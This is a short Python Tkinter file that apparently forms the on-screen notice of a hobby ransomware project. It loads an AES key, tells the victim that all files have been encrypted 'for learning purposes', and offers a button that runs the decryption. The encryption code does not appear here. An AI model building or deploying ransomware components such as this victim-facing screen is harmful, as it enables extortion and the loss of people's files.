import tkinter as tk
from .aes import AES
import json

# Don't tell me that this GUI is ugly, I know it.

KEY = json.load(open('data/key.json'))

aes = AES(KEY)

HEIGHT = 600
WIDTH = 800

root = tk.Tk()

# Handles resolution.
canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
canvas.pack()

# Handles background color.
frame = tk.Frame(root, bg='#000000')
frame.place(relx=0, rely=0, relwidth=1, relheight=1)

label = tk.Label(frame, 
                 text='''All of your files have been encrypted. Since I\'m a nice guy and 
                 I\'ve only done this because of learning purposes, To decrypt your
                 files, press the button below.''',
                 bg='red',
                 )
                 
label.config(font=(20))
label.pack()

btn = tk.Button(root, text='Decrypt files', command=aes.decrypt_root)
btn.pack()

root.mainloop()

